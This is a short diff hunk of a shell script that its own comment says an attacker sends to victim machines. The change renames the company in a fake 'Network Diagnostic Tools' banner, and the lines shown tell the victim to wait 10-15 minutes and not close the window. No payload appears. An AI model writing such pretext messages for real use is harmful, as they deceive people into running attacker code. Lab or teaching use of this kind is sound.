@@ -2,7 +2,7 @@
 
 # This script (sent by the attacker) is executed by the VICTIM machines
 
-echo '***** Welcome to CRAP Company Network Diagnostic Tools *****\n'
+echo '***** Welcome to iPear Company Network Diagnostic Tools *****\n'
 sleep 2
 echo 'Please sit back and wait... we are detecting whats wrong on your device. It may take 10-15 mins.'
 echo 'Reminder: Dont close this window! Your network will be slow again if you do so!'
